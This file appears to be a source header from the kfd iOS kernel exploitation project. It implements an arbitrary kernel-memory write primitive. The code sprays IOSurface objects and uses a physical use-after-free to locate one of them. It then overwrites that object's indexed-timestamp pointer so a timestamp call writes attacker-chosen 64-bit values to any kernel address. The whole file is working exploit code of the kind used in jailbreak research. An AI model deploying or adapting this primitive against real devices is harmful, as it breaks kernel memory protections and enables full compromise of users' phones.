//
//  kwrite_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 30.07.23.
//
// I attempted to make this standalone from kread but that probably doesn't work, so just select IOSurface for both kread and kwrite

#ifndef kwrite_IOSurface_h
#define kwrite_IOSurface_h

#include "../kread/kread_IOSurface.h"

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_IOSurface_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = 0x4000;
    kfd->kwrite.krkw_object_size = 0x400;
    if (kfd->kwrite.krkw_method_data) {
        return;
    }
    extern void kread_IOSurface_init(struct kfd* kfd);
    if (kfd->kread.krkw_method_ops.init == kread_IOSurface_init) {
        kfd->kread.krkw_maximum_id = 0x4000;
        kfd->kread.krkw_object_size = 0x400;
    }
    
    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id) * (sizeof(struct iosurface_obj)));
    NSLog(@"[DEBUG] method_data_size=0x%llx", kfd->kwrite.krkw_method_data_size);
    
    if (kfd->kwrite.krkw_method_data == NULL) {
        kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);
    }
    
    // For some reson on some devices calling get_surface_client crashes while the PUAF is active
    // So we just call it here and keep the reference
    g_surfaceConnect = get_surface_client();
}

void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
    
    IOSurfaceFastCreateArgs args = {0};
    args.IOSurfaceAddress = 0;
    args.IOSurfaceAllocSize =  (u32)id + 1;

    args.IOSurfacePixelFormat = IOSURFACE_MAGIC;

    objectStorage[id].port = create_surface_fast_path(g_surfaceConnect, &objectStorage[id].surface_id, &args);
}

bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    if (kfd->kread.krkw_method_ops.init == kread_IOSurface_init) {
        // use IOSurface method to kread, object id should be
        // found already
        if (object_uaddr != kfd->kwrite.krkw_object_uaddr) {
            return false;
        }
        kfd->kwrite.krkw_object_id = kfd->kread.krkw_object_id;
        kfd->kwrite.krkw_object_uaddr = object_uaddr;
        return true;
    }
    u32 magic = dynamic_uget(IOSurface, PixelFormat, object_uaddr);
    if (magic == IOSURFACE_MAGIC) {
        u64 id = dynamic_uget(IOSurface, AllocSize, object_uaddr) - 1;
        // kfd->kread.krkw_object_id = id;
        kfd->kwrite.krkw_object_id = id;
        kfd->kwrite.krkw_object_uaddr = object_uaddr;
        return true;
    }
    return false;
}

void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_IOSurface_kwrite_u64);
}

void kwrite_IOSurface_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (id != kfd->kwrite.krkw_object_id) {
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
        release_surface(objectStorage[id].port, objectStorage[id].surface_id);
    }
}

void kwrite_IOSurface_free(struct kfd* kfd)
{
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
    struct iosurface_obj krwObject = objectStorage[kfd->kwrite.krkw_object_id];
    release_surface(krwObject.port, krwObject.surface_id);
}

/*
 * 64-bit kwrite function.
 */

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    u64 iosurface_uaddr = 0;
    struct iosurface_obj krwObject = { 0 };
    
    iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
    struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
    krwObject = objectStorage[kfd->kwrite.krkw_object_id];
    
    u64 backup = dynamic_uget(IOSurface, IndexedTimestampPtr, iosurface_uaddr);
    dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, kaddr);
    
    set_indexed_timestamp(krwObject.port, krwObject.surface_id, 0, new_value);
    dynamic_uset(IOSurface, IndexedTimestampPtr, iosurface_uaddr, backup);
}


#endif /* kwrite_IOSurface_h */
